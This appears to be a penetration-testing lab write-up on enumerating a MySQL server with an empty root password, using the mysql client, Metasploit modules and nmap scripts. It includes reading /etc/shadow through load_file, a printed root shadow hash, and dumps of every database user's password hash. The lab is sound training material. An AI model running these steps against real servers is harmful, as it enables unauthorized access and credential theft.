# MySQL Recon: Basics

1. What is the version of MySQL server?

**Note**: Port 3306 is the one commonly used by MySQL server.

The current version of MySQL is 5.5.62-0ubuntu0.14.04.1.

2. What command is used to connect to remote MySQL database?

The proper command is `mysql -h x.x.x.x -u root`.

3. How many databases are present on the database server?

This can be achieved with the command `show databases;` in the mysql command line.
There are 11 databases.

4. How many records are present in table “authors”? This table is present inside the “books” database.

There are 10 records in the authors table.

5. Dump the schema of all databases from the server using suitable metasploit module?

In this case we use the auxiliary module `scanner/mysql/mysql_schemadump`.

- DBName: books
  Tables:
  - TableName: authors
    Columns:
    - ColumnName: id
      ColumnType: int(11)
    - ColumnName: first_name
      ColumnType: varchar(50)
    - ColumnName: last_name
      ColumnType: varchar(50)
    - ColumnName: email
      ColumnType: varchar(100)
    - ColumnName: birthdate
      ColumnType: date
    - ColumnName: added
      ColumnType: timestamp
- DBName: data
  Tables: []
- DBName: password
  Tables: []
- DBName: secret
  Tables: []
- DBName: store
  Tables: []
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []

6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.

In msfconsole we will use the auxiliary module `scanner/mysql/mysql_writable_dirs`.

**Note**: When using this module, remember to set the dir_list and rhosts.
**Note**: If you want metasploit to set up a global variable, use `setg` instead if `set`.
**Note**: msfconsole can use the `advanced` command to show advanced options for the selected module.

Only two directories are writable in that machine using sql: /root and /tmp.

**Note**: Through the database we can know what directories are writable in that machine.

7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.

There are ten sensitive files readable from the database:

[+] 192.49.213.3:3306     - /etc/passwd is a file and exists
[+] 192.49.213.3:3306     - /etc/shadow is a file and exists
[+] 192.49.213.3:3306     - /etc/group is a file and exists
[+] 192.49.213.3:3306     - /etc/mysql/my.cnf is a file and exists
[+] 192.49.213.3:3306     - /etc/hosts is a file and exists
[+] 192.49.213.3:3306     - /etc/hosts.allow is a file and exists
[+] 192.49.213.3:3306     - /etc/hosts.deny is a file and exists
[+] 192.49.213.3:3306     - /etc/issue is a file and exists
[+] 192.49.213.3:3306     - /etc/fstab is a file and exists
[+] 192.49.213.3:3306     - /proc/version is a file and exists

8. Find the system password hash for user "root".

We can actually load files from the mysql server. It is pretty interesting to get information we cannot usually get any other way like this in the mysql server: `select load_file("/path/to/file")`. A common file is for example the /etc/shadow file or the keys for ssh. 

Full record: `root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::`.

Hash: `S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/`.

9. How many database users are present on the database server? Lists their names and password hashes.

In msfconsole we will use the auxiliary module `scanner/mysql/mysql_hashdump`.

**Note**: Even when the string value for an option in a metasploit module is empty, it doesn't mean it is a null string. If you want it to be a null string, set it.

response:

[+] 192.49.213.3:3306     - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.49.213.3:3306     - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.49.213.3:3306     - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.49.213.3:3306     - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.49.213.3:3306     - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.49.213.3:3306     - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.49.213.3:3306     - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14

10. Check whether anonymous login is allowed on MySQL Server.

This can be sort of done using the nmap script `mysql-empty-password`. In this case only root has empty password.

11. Check whether “InteractiveClient” capability is supported on the MySQL server.

This can be achieved using the nmap script `mysql-info`. InteractiveClient capability is supported.

12. Enumerate the users present on MySQL database server using mysql-users nmap script.

Not only using mysql-users but also passing mysql-args: mysqluser and mysqlpass.

enumeration:

| mysql-users: 
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra

13. List all databases stored on the MySQL Server using nmap script.

This can be achieved with the `mysql-databases` nmap script. Passing mysqluser and mysqlpass as script-args as well.

| mysql-databases: 
|   information_schema
|   books
|   data
|   mysql
|   password
|   performance_schema
|   secret
|   store
|   upload
|   vendors
|_  videos

14. Find the data directory used by mysql server using nmap script.

The data directory can be found using the mysql-variables nmap script. This data directory practically stores the whole database, so it is pretty important. Data directory: `/var/lib/mysql/`.

**Note**: Knowing how to interact with the mysql variables is really useful.

15. Check whether File Privileges can be granted to non admin users using `mysql-audit` nmap script.

This is an example of the nmap command to run the `mysql-audit` script: `nmap 192.49.213.3 -p 3306 --script mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"`.

Based on the results, it does not grant privileges to non admin users.

Results of the audit:

| mysql-audit: 
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|     
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint

16. Dump all user hashes using  nmap script.

In this case we use the script `mysql-dump-hashes` with script-args username and password.

| mysql-dump-hashes: 
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14

17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.

In this case we need to use the nmap script `mysql-query` with script-args username, password and query.

answer:

| mysql-query: 
|   count(*)
|   10
|   
|   Query: select count(*) from books.authors
|_  User: root
